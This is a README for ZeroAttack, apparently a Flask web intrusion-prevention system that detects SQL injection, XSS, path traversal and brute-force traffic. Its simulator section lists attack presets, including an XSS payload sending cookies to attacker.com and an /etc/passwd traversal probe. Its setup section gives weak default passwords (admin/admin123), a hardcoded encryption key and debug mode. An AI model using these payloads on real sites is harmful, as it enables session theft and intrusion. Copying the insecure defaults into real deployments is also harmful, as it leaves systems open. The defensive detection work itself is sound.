# ZeroAttack – Intelligent Rule-Based Cyber Attack Detection and Prevention System

ZeroAttack is a high-performance web security platform and intrusion prevention system (IPS) designed to inspect incoming HTTP requests in real time, classify potential attack vectors using dual-layer rule signatures and statistical anomaly algorithms, calculate risk scores, encrypt sensitive forensic records, and automate IP quarantines.

---

## 🛡️ Core Capabilities

1. **Real-Time HTTP Request Inspection**
   - Extracts and sanitizes request parameters, HTTP methods, target URLs, User-Agents, request velocities, and bodies.
2. **Rule-Based Threat Detection Engine**
   - Deterministic regex and heuristic signature matching for:
     - **SQL Injection (SQLi)**: Boolean tautologies (`' OR 1=1`), UNION SELECT queries, stacked query executions, time-based primitives, and comment delimiters.
     - **Cross-Site Scripting (XSS)**: Inline `<script>` payloads, DOM event triggers (`onerror`, `onload`), pseudo-protocols (`javascript:`), and cookie theft primitives.
     - **Parameter Tampering & Path Traversal**: Directory traversal tokens (`../`, `..\\`), OS sensitive file probes (`/etc/passwd`), and administrative role overrides (`isAdmin=true`).
     - **Automated Tool Fingerprints**: Scanner detection (Sqlmap, Nikto, Acunetix, Gobuster, Headless HTTP clients).
3. **Statistical Anomaly Detection Service**
   - Velocity surge tracking (sliding window Z-score calculation against baseline request rates).
   - Brute-force credential stuffing burst identification on authentication endpoints (`/login`, `/auth`).
   - Shannon Information Entropy scoring on request payloads to detect packed shellcode or encoded binaries.
   - Malformed / missing User-Agent header anomalies.
4. **Composite Risk Scoring & Classification**
   - Blends rule confidence weights, anomaly severity contributions, and source IP reputation.
   - Classified into four distinct bands:
     - **LOW (0 - 29)**: Routine benign activity.
     - **MEDIUM (30 - 59)**: Repeated failed parameters or minor suspicious telemetry.
     - **HIGH (60 - 79)**: Verified hostile payload signature; automatic quarantine recommendation.
     - **CRITICAL (80 - 100)**: Hostile multi-vector exploitation attempt; triggers automated IP block.
5. **Authenticated Forensic Payload Encryption (AES-256-GCM)**
   - Plain request payloads are securely encrypted using **AES-256-GCM** with 96-bit unique nonces and 128-bit authentication tags before persistence in MySQL.
   - Authorized analysts and administrators can decrypt payload records for forensically sound post-incident analysis.
6. **Automated Prevention & IP Quarantine**
   - High-risk source IPs triggering CRITICAL thresholds are automatically firewalled for 30 minutes, preventing further network abuse.
7. **Role-Based Access Control (RBAC)**
   - **ADMIN**: Full system control, rule deployment, IP unblocking, user administration, mitigation overrides.
   - **SECURITY ANALYST**: Live incident triage, attack forensics, authorized payload decryption, alerts review.
   - **VIEWER**: Read-only SOC telemetry, historical statistics, and executive reports.
8. **Comprehensive Audit Trail**
   - Immutable chronological tracking of administrative logins, signature modifications, IP blocks, and decryption events.

---

## 🏗️ Project Architecture

```
ZeroAttack/
│
├── app.py                      # Flask Application Server & Blueprint Dispatcher
├── config.py                   # Environment, Database & Encryption Configuration
├── requirements.txt            # Python Dependencies
├── .env.example                # Sample Environment Secret Variables
│
├── database/
│   ├── schema.sql              # MySQL DDL & Initial Rule Seeds
│   └── db.py                   # PyMySQL Connection Pool with In-Memory Fallback
│
├── detection/
│   ├── attack_patterns.py      # Regex Signatures for SQLi, XSS, Tampering, Scanners
│   ├── rule_engine.py          # Deterministic Rule Matching Pipeline
│   ├── anomaly_detector.py     # Statistical Velocity, Entropy & Behavior Analyzer
│   └── risk_scoring.py         # Multi-factor Risk Scoring & Classification Engine
│
├── security/
│   ├── encryption.py           # AES-256-GCM Payload Cipher Service
│   ├── authentication.py       # Password Hashing (scrypt/PBKDF2) & JWT Session Tokens
│   └── authorization.py        # RBAC Decorators (Admin, Security Analyst, Viewer)
│
├── routes/
│   ├── auth.py                 # User Login, Registration, Session Management
│   ├── dashboard.py            # Real-Time Metrics & Chart.js Dataset Aggregators
│   ├── events.py               # Live /analyze Pipeline & Forensic Event Endpoints
│   ├── rules.py                # Detection Signature CRUD & Toggle Endpoints
│   ├── ips.py                  # Quarantine & Whitelist Management
│   └── users.py                # User Clearances & Audit Log Endpoints
│
├── templates/                  # Server-Side Rendered HTML5 Interfaces
│   ├── dashboard.html          # Real-time SOC Security Dashboard
│   ├── monitor.html            # Live HTTP Request Simulator & Inspector
│   ├── events.html             # Forensic Incident Feed
│   ├── event_details.html      # Deep-dive Event Inspection & Decryption
│   ├── ips.html                # Blocked IP Quarantine Console
│   ├── rules.html              # Threat Signature Management
│   ├── users.html              # RBAC Directory
│   ├── reports.html            # Incident & Threat Intelligence Reports
│   ├── audit.html              # System Compliance & Audit Trail
│   ├── login.html              # Clearance Authentication
│   └── register.html           # Access Request Form
│
├── static/
│   ├── css/style.css           # Cybersecurity Dark Theme Stylesheet
│   └── js/
│       ├── dashboard.js        # Chart.js Renderers & Live Metric Poller
│       └── monitor.js          # Interactive Payload Tester & Form Dispatcher
│
└── README.md                   # System Documentation & Runbook
```

---

## ⚙️ Installation & Local Setup

### 1. Prerequisites
- Python 3.9+ installed
- MySQL 8.0+ server installed (Optional: the system features automatic in-memory persistence fallback if MySQL is offline)
- `pip` package manager

### 2. Environment Setup
```bash
# Clone the repository
git clone https://github.com/organization/ZeroAttack.git
cd ZeroAttack

# Create and activate a Python virtual environment
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install required dependencies
pip install -r requirements.txt
```

### 3. MySQL Database Setup
```bash
# Log in to your local MySQL instance
mysql -u root -p

# Execute the ZeroAttack schema script
mysql -u root -p < database/schema.sql
```

### 4. Configuration (.env)
Copy `.env.example` to `.env` and configure your credentials:
```env
FLASK_DEBUG=True
PORT=5000
SECRET_KEY=zeroattack-production-secret-key-32bytes
DB_HOST=localhost
DB_PORT=3306
DB_USER=root
DB_PASSWORD=your_mysql_password
DB_NAME=zeroattack_db
ENCRYPTION_KEY=ZeroAttack2026SecureKey32Bytes!!
REQUEST_FREQ_THRESHOLD=25
AUTO_BLOCK_RISK_THRESHOLD=80
BLOCK_DURATION_MINUTES=30
```

### 5. Start the ZeroAttack Server
```bash
python app.py
```
The server will boot on `http://127.0.0.1:5000/`.

---

## 🔑 Default Credentials & Role Accounts

| Username | Password | Role | Clearance Capabilities |
| :--- | :--- | :--- | :--- |
| `admin` | `admin123` | **ADMIN** | Full system administration, IP unblocking, rule management, payload decryption |
| `analyst` | `analyst123` | **SECURITY ANALYST** | Incident triage, forensic packet decryption, threat investigation |
| `viewer` | `viewer123` | **VIEWER** | Read-only telemetry, historical charts, audit review |

---

## 🧪 Testing the Live Attack Simulator

Navigate to **Live Security Monitor** (`/monitor`) or click on one of the one-click injection presets:

1. **SQL Injection**:
   - `username=admin' OR '1'='1&password=test`
   - *Result*: Matched rule: Classic Boolean Tautology, Risk: 85/100, Severity: CRITICAL, Automated IP Block triggered.
2. **Cross-Site Scripting (XSS)**:
   - `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
   - *Result*: Matched rule: Stored & Reflected Script Tags, Risk: 75/100, Severity: HIGH, Action: QUARANTINED.
3. **Directory Traversal**:
   - `/download?file=../../../../etc/passwd`
   - *Result*: Matched rule: Sensitive File Probe, Risk: 75/100, Severity: HIGH.
4. **Brute Force Burst**:
   - Frequency: 48 req/min to `/api/v1/auth/login`
   - *Result*: Anomaly detection: Request Velocity Surge + Brute-force auth pattern, Risk: 88/100, Severity: CRITICAL, Action: BLOCKED.
5. **Clean Benign Request**:
   - Normal browser User-Agent, GET request to `/api/products?id=12`
   - *Result*: Risk Score: 5/100, Severity: LOW, Action: MONITORED.

---

## 🔒 Forensic Payload Encryption Flow

```
[ Incoming HTTP Packet ]
          │
          ▼
[ Rule Engine & Anomaly Detector ] ───► Calculates Risk Score (0-100)
          │
          ▼
[ AES-256-GCM Encryption ] ──────────► Generates Nonce (96-bit) + 128-bit MAC
          │
          ▼
[ Encrypted Record in MySQL ] ────────► Stored safely in `security_events` table
          │
          ▼
[ Authorized Decryption ] ────────────► Accessible only by ADMIN / SECURITY ANALYST roles
```

---

## ⚖️ Security Disclaimer
ZeroAttack provides multi-tier defense-in-depth, statistical anomaly detection, and automated mitigation. In production environments, it should be paired with secure coding practices, parameterized SQL queries, content security policies (CSP), and enterprise Web Application Firewalls (WAF).
